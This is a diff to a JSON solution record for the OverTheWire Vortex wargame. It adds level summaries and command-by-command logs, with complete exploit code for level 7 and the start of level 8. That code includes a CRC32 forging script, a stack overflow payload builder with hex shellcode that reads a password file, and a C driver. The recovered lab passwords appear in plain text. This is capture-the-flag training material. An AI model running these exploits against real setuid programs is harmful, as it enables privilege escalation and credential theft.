@@ -6,7 +6,11 @@
   "3": "Get the vortex4 password. /vortex/vortex3 (setuid root) copies argv[1] into a 128-byte buffer and then writes the buffer address into the GOT slot named by lpp; put 69 bytes of NUL-free shellcode in the buffer and set lpp to exit's GOT slot (0x804b200), so the next call to exit jumps onto the executable stack.",
   "4": "Get the vortex5 password. /vortex/vortex4 (setuid vortex5) calls printf(argv[3]), but with argc==1 and an empty argv[0] it reaches printf on envp[1]: the format string is the second environment variable. Two %hn writes through vararg slots 125 and 126 overwrite exit's GOT slot with the shellcode address, and exit jumps into 69 bytes of shellcode on the executable stack.",
   "5": "Get the vortex6 password. /vortex/vortex5 (setuid vortex6) checks the MD5 of the entered password against a fixed digest; brute-force the 5-character alphanumeric preimage with a multiprocess search and use the password to get a shell as vortex6.",
-  "6": "Get the vortex7 password. /vortex/vortex6 (setuid vortex7) re-execs argv[0] as root; run it with argv[0] set to /bin/sh, so restart re-execs a shell with real uid vortex7."
+  "6": "Get the vortex7 password. /vortex/vortex6 (setuid vortex7) re-execs argv[0] as root; run it with argv[0] set to /bin/sh, so restart re-execs a shell with real uid vortex7.",
+  "7": "Get the vortex8 password. /vortex/vortex7 (setuid vortex8) only runs strcpy on argv[1] when its CRC32 is 0xe1ca95ee; solve the CRC patch with a GF(2) linear system, then overflow the 350-byte buffer with a NOP sled and setreuid shellcode on the executable stack, delivered by a raw-bytes argv driver.",
+  "8": "Get the vortex9 password. /vortex/vortex8 (setuid vortex9) drops its euid before overflowing, but the safecode thread it spawned keeps euid vortex9; overwrite sleep's GOT slot to hijack the thread, sweep the buffer address with a uid-signature shellcode, then run a password shellcode that reads /etc/vortex_pass/vortex9 \u2014 over ssh -T, since a pty drags the thread's euid down.",
+  "9": "Get the vortex10 password. There is no /vortex/vortex9 binary and /vortex/vortex10 is unreachable from vortex9, but /var/mail/vortex9 holds the vortex10 password in plain text; read it and log in as vortex10.",
+  "10": "Get the vortex11 password. /vortex/vortex10 (setuid vortex11) seeds rand() with a time-derived value and prints 20 rand() outputs; brute-force the seed with the target's own libc rand, then send the seed as 4 raw little-endian bytes to get a shell as vortex11."
  },
  "host": "vortex.labs.overthewire.org",
  "levels": [
@@ -2917,6 +2921,2173 @@
      "cmd": "cat /etc/vortex_pass/vortex7",
      "out": [
       "kZ90cmNy9"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 7,
+   "pw": "X2cOOCYnT",
+   "user": "vortex7",
+   "steps": [
+    {
+     "cmd": "ssh vortex7@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "d=/tmp/l7rec-$RANDOM; mkdir $d && cd $d && echo WORKDIR=$d",
+     "out": [
+      "WORKDIR=/tmp/l7rec-10314"
+     ]
+    },
+    {
+     "cmd": "cp /vortex/vortex7 v7 && md5sum v7",
+     "out": [
+      "c4f614fe053e5e2f3d4c34e0d34fd878  v7"
+     ]
+    },
+    {
+     "cmd": "ls -l /vortex/vortex7",
+     "out": [
+      "-r-sr-x--- 1 vortex8 vortex7 14956 Oct 25 13:41 /vortex/vortex7"
+     ]
+    },
+    {
+     "cmd": "/vortex/vortex7 test",
+     "out": [
+      "0xf93ba110"
+     ]
+    },
+    {
+     "cmd": "/vortex/vortex7 $'test\\xe4\\xf0\\x19O'",
+     "out": []
+    },
+    {
+     "cmd": "objdump -d v7 | grep -A28 '<main>:'",
+     "out": [
+      "080491ca <main>:",
+      " 80491ca:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx",
+      " 80491ce:\t83 e4 f0             \tand    $0xfffffff0,%esp",
+      " 80491d1:\tff 71 fc             \tpush   -0x4(%ecx)",
+      " 80491d4:\t55                   \tpush   %ebp",
+      " 80491d5:\t89 e5                \tmov    %esp,%ebp",
+      " 80491d7:\t53                   \tpush   %ebx",
+      " 80491d8:\t51                   \tpush   %ecx",
+      " 80491d9:\t83 ec 40             \tsub    $0x40,%esp",
+      " 80491dc:\t89 cb                \tmov    %ecx,%ebx",
+      " 80491de:\t8b 43 04             \tmov    0x4(%ebx),%eax",
+      " 80491e1:\t83 c0 04             \tadd    $0x4,%eax",
+      " 80491e4:\t8b 00                \tmov    (%eax),%eax",
+      " 80491e6:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 80491e9:\t50                   \tpush   %eax",
+      " 80491ea:\te8 71 fe ff ff       \tcall   8049060 <strlen@plt>",
+      " 80491ef:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80491f2:\t89 c2                \tmov    %eax,%edx",
+      " 80491f4:\t8b 43 04             \tmov    0x4(%ebx),%eax",
+      " 80491f7:\t83 c0 04             \tadd    $0x4,%eax",
+      " 80491fa:\t8b 00                \tmov    (%eax),%eax",
+      " 80491fc:\t83 ec 04             \tsub    $0x4,%esp",
+      " 80491ff:\t52                   \tpush   %edx",
+      " 8049200:\t50                   \tpush   %eax",
+      " 8049201:\t6a 00                \tpush   $0x0",
+      " 8049203:\te8 7e ff ff ff       \tcall   8049186 <crc32>",
+      " 8049208:\t83 c4 10             \tadd    $0x10,%esp",
+      " 804920b:\t89 45 f4             \tmov    %eax,-0xc(%ebp)",
+      " 804920e:\t81 7d f4 ee 95 ca e1 \tcmpl   $0xe1ca95ee,-0xc(%ebp)"
+     ]
+    },
+    {
+     "cmd": "objdump -d v7 --section=.plt | head -14",
+     "out": [
+      "v7:     file format elf32-i386",
+      "",
+      "",
+      "Disassembly of section .plt:",
+      "",
+      "08049020 <__libc_start_main@plt-0x10>:",
+      " 8049020:\tff 35 f8 bf 04 08    \tpush   0x804bff8",
+      " 8049026:\tff 25 fc bf 04 08    \tjmp    *0x804bffc",
+      " 804902c:\t00 00                \tadd    %al,(%eax)",
+      "\t...",
+      "",
+      "08049030 <__libc_start_main@plt>:",
+      " 8049030:\tff 25 00 c0 04 08    \tjmp    *0x804c000"
+     ]
+    },
+    {
+     "cmd": "readelf -l v7 | grep -E 'GNU_STACK' -A1",
+     "out": [
+      "  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+      "  GNU_RELRO      0x002f00 0x0804bf00 0x0804bf00 0x00100 0x00100 R   0x1"
+     ]
+    },
+    {
+     "cmd": "vim crcpatch.py",
+     "text": "vim crcpatch.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "crcpatch.py                                                                       0,0-1          All",
+      "\"crcpatch.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim crcpatch.py",
+     "text": "vim crcpatch.py -- insert chunk 1",
+     "out": [
+      "  1 def make_table():",
+      "  2     tbl = []",
+      "  3     for i in range(256):",
+      "  4         c = i",
+      "  5         for _ in range(8):",
+      "  6             c = (c >> 1) ^ (0xedb88320 if c & 1 else 0)",
+      "  7         tbl.append(c)",
+      "  8     return tbl",
+      "  9 TBL = make_table()",
+      " 10",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "crcpatch.py [+]                                                                   10,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crcpatch.py",
+     "text": "vim crcpatch.py -- insert chunk 2",
+     "out": [
+      "  1 def make_table():",
+      "  2     tbl = []",
+      "  3     for i in range(256):",
+      "  4         c = i",
+      "  5         for _ in range(8):",
+      "  6             c = (c >> 1) ^ (0xedb88320 if c & 1 else 0)",
+      "  7         tbl.append(c)",
+      "  8     return tbl",
+      "  9 TBL = make_table()",
+      " 10",
+      " 11 def crc7(data, crc=0):",
+      " 12     for b in data:",
+      " 13         crc = TBL[(crc ^ b) & 0xff] ^ (crc >> 8)",
+      " 14     return crc",
+      " 15",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "crcpatch.py [+]                                                                   15,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crcpatch.py",
+     "text": "vim crcpatch.py -- insert chunk 3",
+     "out": [
+      "  9 TBL = make_table()",
+      " 10",
+      " 11 def crc7(data, crc=0):",
+      " 12     for b in data:",
+      " 13         crc = TBL[(crc ^ b) & 0xff] ^ (crc >> 8)",
+      " 14     return crc",
+      " 15",
+      " 16 def solve_linear(deltas, want):",
+      " 17     basis = {}",
+      " 18     for i in range(32):",
+      " 19         v, t = deltas[i], 1 << i",
+      " 20         while v:",
+      " 21             top = v.bit_length() - 1",
+      " 22             if top in basis:",
+      " 23                 bv, bt = basis[top]",
+      " 24                 v ^= bv; t ^= bt",
+      " 25             else:",
+      " 26                 basis[top] = (v, t)",
+      " 27                 break",
+      " 28     v, t = want, 0",
+      " 29     while v:",
+      " 30         top = v.bit_length() - 1",
+      " 31         if top not in basis:",
+      " 32             return None",
+      " 33         bv, bt = basis[top]",
+      " 34         v ^= bv; t ^= bt",
+      " 35     return t",
+      " 36",
+      "crcpatch.py [+]                                                                   36,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crcpatch.py",
+     "text": "vim crcpatch.py -- insert chunk 4",
+     "out": [
+      " 21             top = v.bit_length() - 1",
+      " 22             if top in basis:",
+      " 23                 bv, bt = basis[top]",
+      " 24                 v ^= bv; t ^= bt",
+      " 25             else:",
+      " 26                 basis[top] = (v, t)",
+      " 27                 break",
+      " 28     v, t = want, 0",
+      " 29     while v:",
+      " 30         top = v.bit_length() - 1",
+      " 31         if top not in basis:",
+      " 32             return None",
+      " 33         bv, bt = basis[top]",
+      " 34         v ^= bv; t ^= bt",
+      " 35     return t",
+      " 36",
+      " 37 def patch4(base, target):",
+      " 38     zeros_crc = crc7(base + b'\\x00\\x00\\x00\\x00')",
+      " 39     deltas = []",
+      " 40     for i in range(32):",
+      " 41         p = bytearray(4)",
+      " 42         p[i // 8] |= 1 << (i % 8)",
+      " 43         deltas.append(crc7(base + bytes(p)) ^ zeros_crc)",
+      " 44     want = target ^ zeros_crc",
+      " 45     sel = solve_linear(deltas, want)",
+      " 46     if sel is None: return None",
+      " 47     return bytes([(sel >> (8*i)) & 0xff for i in range(4)])",
+      " 48",
+      "crcpatch.py [+]                                                                   48,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crcpatch.py",
+     "text": "vim crcpatch.py -- insert chunk 5",
+     "out": [
+      " 29     while v:",
+      " 30         top = v.bit_length() - 1",
+      " 31         if top not in basis:",
+      " 32             return None",
+      " 33         bv, bt = basis[top]",
+      " 34         v ^= bv; t ^= bt",
+      " 35     return t",
+      " 36",
+      " 37 def patch4(base, target):",
+      " 38     zeros_crc = crc7(base + b'\\x00\\x00\\x00\\x00')",
+      " 39     deltas = []",
+      " 40     for i in range(32):",
+      " 41         p = bytearray(4)",
+      " 42         p[i // 8] |= 1 << (i % 8)",
+      " 43         deltas.append(crc7(base + bytes(p)) ^ zeros_crc)",
+      " 44     want = target ^ zeros_crc",
+      " 45     sel = solve_linear(deltas, want)",
+      " 46     if sel is None: return None",
+      " 47     return bytes([(sel >> (8*i)) & 0xff for i in range(4)])",
+      " 48",
+      " 49 if __name__ == '__main__':",
+      " 50     base = b'test'",
+      " 51     patch = patch4(base, 0xe1ca95ee)",
+      " 52     print('patch:', patch)",
+      " 53     if patch:",
+      " 54         full = base + patch",
+      " 55         print('crc7(full):', hex(crc7(full)), 'target: 0xe1ca95ee')",
+      " 56",
+      "crcpatch.py [+]                                                                   56,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crcpatch.py",
+     "text": "vim crcpatch.py -- finished, before :wq",
+     "out": [
+      " 29     while v:",
+      " 30         top = v.bit_length() - 1",
+      " 31         if top not in basis:",
+      " 32             return None",
+      " 33         bv, bt = basis[top]",
+      " 34         v ^= bv; t ^= bt",
+      " 35     return t",
+      " 36",
+      " 37 def patch4(base, target):",
+      " 38     zeros_crc = crc7(base + b'\\x00\\x00\\x00\\x00')",
+      " 39     deltas = []",
+      " 40     for i in range(32):",
+      " 41         p = bytearray(4)",
+      " 42         p[i // 8] |= 1 << (i % 8)",
+      " 43         deltas.append(crc7(base + bytes(p)) ^ zeros_crc)",
+      " 44     want = target ^ zeros_crc",
+      " 45     sel = solve_linear(deltas, want)",
+      " 46     if sel is None: return None",
+      " 47     return bytes([(sel >> (8*i)) & 0xff for i in range(4)])",
+      " 48",
+      " 49 if __name__ == '__main__':",
+      " 50     base = b'test'",
+      " 51     patch = patch4(base, 0xe1ca95ee)",
+      " 52     print('patch:', patch)",
+      " 53     if patch:",
+      " 54         full = base + patch",
+      " 55         print('crc7(full):', hex(crc7(full)), 'target: 0xe1ca95ee')",
+      " 56",
+      "crcpatch.py [+]                                                                   56,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "python3 crcpatch.py",
+     "out": [
+      "patch: b'\\xe4\\xf0\\x19O'",
+      "crc7(full): 0xe1ca95ee target: 0xe1ca95ee"
+     ]
+    },
+    {
+     "cmd": "python3 -c \"print('A'*350, end='')\" > dummy.txt",
+     "out": []
+    },
+    {
+     "cmd": "gdb -q -batch -ex 'break *0x804920e' -ex 'unset environment LINES' -ex 'unset environment COLUMNS' -ex 'run \"$(cat dummy.txt)\"' -ex 'p/x $ebp-0x46' /vortex/vortex7",
+     "out": [
+      "This GDB supports auto-downloading debuginfo from the following URLs:",
+      "  <https://debuginfod.ubuntu.com>",
+      "Enable debuginfod for this session? (y or [n]) [answered N; input not from terminal]",
+      "Debuginfod has been disabled.",
+      "To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.",
+      "Breakpoint 1 at 0x804920e",
+      "[Thread debugging using libthread_db enabled]",
+      "Using host libthread_db library \"/usr/lib/x86_64-linux-gnu/libthread_db.so.1\".",
+      "",
+      "Breakpoint 1, 0x0804920e in main ()",
+      "$1 = 0xffffd212"
+     ]
+    },
+    {
+     "cmd": "vim ex7.py",
+     "text": "vim ex7.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex7.py                                                                            0,0-1          All",
+      "\"ex7.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim ex7.py",
+     "text": "vim ex7.py -- insert chunk 1",
+     "out": [
+      "  1 import sys",
+      "  2 from crcpatch import patch4, crc7",
+      "  3",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex7.py [+]                                                                        3,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex7.py",
+     "text": "vim ex7.py -- insert chunk 2",
+     "out": [
+      "  1 import sys",
+      "  2 from crcpatch import patch4, crc7",
+      "  3",
+      "  4 buf = int(sys.argv[1], 16)",
+      "  5 out = sys.argv[2]",
+      "  6 TOTAL = 350",
+      "  7 sc = bytes.fromhex(",
+      "  8     \"31dbb713b39089d9b046cd80\"",
+      "  9     \"31c050\"",
+      " 10     \"6874657838\"",
+      " 11     \"682f766f72\"",
+      " 12     \"6870617373\"",
+      " 13     \"687465785f\"",
+      " 14     \"682f766f72\"",
+      " 15     \"682f657463\"",
+      " 16     \"89e331c9b005cd80\"",
+      " 17     \"89c3b00389e131d2b264cd80\"",
+      " 18     \"89c2b004b30189e1cd80\"",
+      " 19     \"b00131dbcd80\"",
+      " 20 )",
+      " 21 assert b\"\\x00\" not in sc, \"NUL in shellcode\"",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex7.py [+]                                                                        21,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex7.py",
+     "text": "vim ex7.py -- insert chunk 3",
+     "out": [
+      "  1 import sys",
+      "  2 from crcpatch import patch4, crc7",
+      "  3",
+      "  4 buf = int(sys.argv[1], 16)",
+      "  5 out = sys.argv[2]",
+      "  6 TOTAL = 350",
+      "  7 sc = bytes.fromhex(",
+      "  8     \"31dbb713b39089d9b046cd80\"",
+      "  9     \"31c050\"",
+      " 10     \"6874657838\"",
+      " 11     \"682f766f72\"",
+      " 12     \"6870617373\"",
+      " 13     \"687465785f\"",
+      " 14     \"682f766f72\"",
+      " 15     \"682f657463\"",
+      " 16     \"89e331c9b005cd80\"",
+      " 17     \"89c3b00389e131d2b264cd80\"",
+      " 18     \"89c2b004b30189e1cd80\"",
+      " 19     \"b00131dbcd80\"",
+      " 20 )",
+      " 21 assert b\"\\x00\" not in sc, \"NUL in shellcode\"",
+      " 22 sled = TOTAL - 78 - len(sc) - 4",
+      " 23 ecx_val = buf + 78",
+      " 24 ret_val = buf + 160",
+      " 25 payload = b\"A\"*62 + ecx_val.to_bytes(4,\"little\") + b\"BBBB\" + b\"BBBB\" \\",
+      " 26         + ret_val.to_bytes(4,\"little\") + b\"\\x90\"*sled + sc",
+      "~",
+      "~",
+      "ex7.py [+]                                                                        26,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex7.py",
+     "text": "vim ex7.py -- insert chunk 4",
+     "out": [
+      "  7 sc = bytes.fromhex(",
+      "  8     \"31dbb713b39089d9b046cd80\"",
+      "  9     \"31c050\"",
+      " 10     \"6874657838\"",
+      " 11     \"682f766f72\"",
+      " 12     \"6870617373\"",
+      " 13     \"687465785f\"",
+      " 14     \"682f766f72\"",
+      " 15     \"682f657463\"",
+      " 16     \"89e331c9b005cd80\"",
+      " 17     \"89c3b00389e131d2b264cd80\"",
+      " 18     \"89c2b004b30189e1cd80\"",
+      " 19     \"b00131dbcd80\"",
+      " 20 )",
+      " 21 assert b\"\\x00\" not in sc, \"NUL in shellcode\"",
+      " 22 sled = TOTAL - 78 - len(sc) - 4",
+      " 23 ecx_val = buf + 78",
+      " 24 ret_val = buf + 160",
+      " 25 payload = b\"A\"*62 + ecx_val.to_bytes(4,\"little\") + b\"BBBB\" + b\"BBBB\" \\",
+      " 26         + ret_val.to_bytes(4,\"little\") + b\"\\x90\"*sled + sc",
+      " 27 assert len(payload) == TOTAL - 4",
+      " 28 patch = patch4(payload, 0xe1ca95ee)",
+      " 29 assert patch and b\"\\x00\" not in patch, patch",
+      " 30 full = payload + patch",
+      " 31 assert len(full) == TOTAL and b\"\\x00\" not in full",
+      " 32 print(f\"buf=0x{buf:x} sc={len(sc)} sled={sled} len={len(full)}\")",
+      " 33 open(out, \"wb\").write(full)",
+      " 34",
+      "ex7.py [+]                                                                        34,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex7.py",
+     "text": "vim ex7.py -- finished, before :wq",
+     "out": [
+      "  7 sc = bytes.fromhex(",
+      "  8     \"31dbb713b39089d9b046cd80\"",
+      "  9     \"31c050\"",
+      " 10     \"6874657838\"",
+      " 11     \"682f766f72\"",
+      " 12     \"6870617373\"",
+      " 13     \"687465785f\"",
+      " 14     \"682f766f72\"",
+      " 15     \"682f657463\"",
+      " 16     \"89e331c9b005cd80\"",
+      " 17     \"89c3b00389e131d2b264cd80\"",
+      " 18     \"89c2b004b30189e1cd80\"",
+      " 19     \"b00131dbcd80\"",
+      " 20 )",
+      " 21 assert b\"\\x00\" not in sc, \"NUL in shellcode\"",
+      " 22 sled = TOTAL - 78 - len(sc) - 4",
+      " 23 ecx_val = buf + 78",
+      " 24 ret_val = buf + 160",
+      " 25 payload = b\"A\"*62 + ecx_val.to_bytes(4,\"little\") + b\"BBBB\" + b\"BBBB\" \\",
+      " 26         + ret_val.to_bytes(4,\"little\") + b\"\\x90\"*sled + sc",
+      " 27 assert len(payload) == TOTAL - 4",
+      " 28 patch = patch4(payload, 0xe1ca95ee)",
+      " 29 assert patch and b\"\\x00\" not in patch, patch",
+      " 30 full = payload + patch",
+      " 31 assert len(full) == TOTAL and b\"\\x00\" not in full",
+      " 32 print(f\"buf=0x{buf:x} sc={len(sc)} sled={sled} len={len(full)}\")",
+      " 33 open(out, \"wb\").write(full)",
+      " 34",
+      "ex7.py [+]                                                                        34,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -l ex7.py",
+     "out": [
+      "34 ex7.py"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c                                                                             0,0-1          All",
+      "\"drv.c\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- insert chunk 1",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[4096]; FILE *f=fopen(v[1],\"rb\");",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c [+]                                                                         3,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- insert chunk 2",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[4096]; FILE *f=fopen(v[1],\"rb\");",
+      "  4  size_t n=fread(buf,1,sizeof buf-1,f); fclose(f); buf[n]=0;",
+      "  5  char *a[]={\"/vortex/vortex7\", buf, 0}; execv(a[0],a); return 51; }",
+      "  6",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c [+]                                                                         6,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- finished, before :wq",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[4096]; FILE *f=fopen(v[1],\"rb\");",
+      "  4  size_t n=fread(buf,1,sizeof buf-1,f); fclose(f); buf[n]=0;",
+      "  5  char *a[]={\"/vortex/vortex7\", buf, 0}; execv(a[0],a); return 51; }",
+      "  6",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c [+]                                                                         6,1            All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "gcc -o drv7 drv.c && ls -l drv7",
+     "out": [
+      "-rwxrwxr-x 1 vortex7 vortex7 16160 Nov 16 10:07 drv7"
+     ]
+    },
+    {
+     "cmd": "python3 ex7.py $(gdb -q -batch -ex 'break *0x804920e' -ex 'unset environment LINES' -ex 'unset environment COLUMNS' -ex 'run \"$(cat dummy.txt)\"' -ex 'p/x $ebp-0x46' /vortex/vortex7 2>/dev/null | grep -oE '0x[0-9a-f]+' | tail -1) pay7.bin",
+     "out": [
+      "buf=0xffffd212 sc=81 sled=187 len=350"
+     ]
+    },
+    {
+     "cmd": "./drv7 pay7.bin",
+     "out": [
+      "X2cOOCYnT"
+     ]
+    },
+    {
+     "cmd": "./drv7 pay7.bin; echo \"RC=$?\"",
+     "out": [
+      "X2cOOCYnT",
+      "RC=0"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex8@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5008(vortex8) gid=5008(vortex8) groups=5008(vortex8)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex8",
+     "out": [
+      "X2cOOCYnT"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 8,
+   "pw": "XdTW4yCeq",
+   "user": "vortex8",
+   "steps": [
+    {
+     "cmd": "ssh vortex8@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "d=/tmp/l8rec-$RANDOM; mkdir $d && cd $d && echo WORKDIR=$d",
+     "out": [
+      "WORKDIR=/tmp/l8rec-9319"
+     ]
+    },
+    {
+     "cmd": "cp /vortex/vortex8 v8 && md5sum v8",
+     "out": [
+      "a2cae4e765bc58316b34dbe7f64af120  v8"
+     ]
+    },
+    {
+     "cmd": "ls -l /vortex/vortex8; ls -l /etc/vortex_pass/vortex9",
+     "out": [
+      "-r-sr-x--- 1 vortex9 vortex8 15152 Oct 25 13:41 /vortex/vortex8",
+      "-r-------- 1 vortex9 vortex9 10 Oct 25 13:40 /etc/vortex_pass/vortex9"
+     ]
+    },
+    {
+     "cmd": "/vortex/vortex8; echo \"RC=$?\" & sleep 2; kill %1 2>/dev/null",
+     "out": [
+      "0",
+      "Segmentation fault         /vortex/vortex8",
+      "[1] 46",
+      "RC=139",
+      "[1]+  Done                       echo \"RC=$?\""
+     ]
+    },
+    {
+     "cmd": "objdump -d v8 | grep -A42 '<safecode>:'",
+     "out": [
+      "080491d6 <safecode>:",
+      " 80491d6:\t55                   \tpush   %ebp",
+      " 80491d7:\t89 e5                \tmov    %esp,%ebp",
+      " 80491d9:\t83 ec 18             \tsub    $0x18,%esp",
+      " 80491dc:\tc7 45 f4 00 00 00 00 \tmovl   $0x0,-0xc(%ebp)",
+      " 80491e3:\t83 ec 08             \tsub    $0x8,%esp",
+      " 80491e6:\tff 75 f4             \tpush   -0xc(%ebp)",
+      " 80491e9:\t68 08 a0 04 08       \tpush   $0x804a008",
+      " 80491ee:\te8 4d fe ff ff       \tcall   8049040 <printf@plt>",
+      " 80491f3:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80491f6:\ta1 2c c0 04 08       \tmov    0x804c02c,%eax",
+      " 80491fb:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 80491fe:\t50                   \tpush   %eax",
+      " 80491ff:\te8 4c fe ff ff       \tcall   8049050 <fflush@plt>",
+      " 8049204:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049207:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 804920a:\t6a 01                \tpush   $0x1",
+      " 804920c:\te8 4f fe ff ff       \tcall   8049060 <sleep@plt>",
+      " 8049211:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049214:\t90                   \tnop",
+      " 8049215:\teb cc                \tjmp    80491e3 <safecode+0xd>",
+      "",
+      "08049217 <unsafecode>:",
+      " 8049217:\t55                   \tpush   %ebp",
+      " 8049218:\t89 e5                \tmov    %esp,%ebp",
+      " 804921a:\t81 ec 08 04 00 00    \tsub    $0x408,%esp",
+      " 8049220:\t83 ec 08             \tsub    $0x8,%esp",
+      " 8049223:\tff 75 08             \tpush   0x8(%ebp)",
+      " 8049226:\t8d 85 f8 fb ff ff    \tlea    -0x408(%ebp),%eax",
+      " 804922c:\t50                   \tpush   %eax",
+      " 804922d:\te8 4e fe ff ff       \tcall   8049080 <strcpy@plt>",
+      " 8049232:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049235:\t90                   \tnop",
+      " 8049236:\tc9                   \tleave",
+      " 8049237:\tc3                   \tret",
+      "",
+      "08049238 <main>:",
+      " 8049238:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx",
+      " 804923c:\t83 e4 f0             \tand    $0xfffffff0,%esp",
+      " 804923f:\tff 71 fc             \tpush   -0x4(%ecx)",
+      " 8049242:\t55                   \tpush   %ebp",
+      " 8049243:\t89 e5                \tmov    %esp,%ebp",
+      " 8049245:\t57                   \tpush   %edi"
+     ]
+    },
+    {
+     "cmd": "objdump -d v8 | grep -A28 '<unsafecode>:'",
+     "out": [
+      "08049217 <unsafecode>:",
+      " 8049217:\t55                   \tpush   %ebp",
+      " 8049218:\t89 e5                \tmov    %esp,%ebp",
+      " 804921a:\t81 ec 08 04 00 00    \tsub    $0x408,%esp",
+      " 8049220:\t83 ec 08             \tsub    $0x8,%esp",
+      " 8049223:\tff 75 08             \tpush   0x8(%ebp)",
+      " 8049226:\t8d 85 f8 fb ff ff    \tlea    -0x408(%ebp),%eax",
+      " 804922c:\t50                   \tpush   %eax",
+      " 804922d:\te8 4e fe ff ff       \tcall   8049080 <strcpy@plt>",
+      " 8049232:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049235:\t90                   \tnop",
+      " 8049236:\tc9                   \tleave",
+      " 8049237:\tc3                   \tret",
+      "",
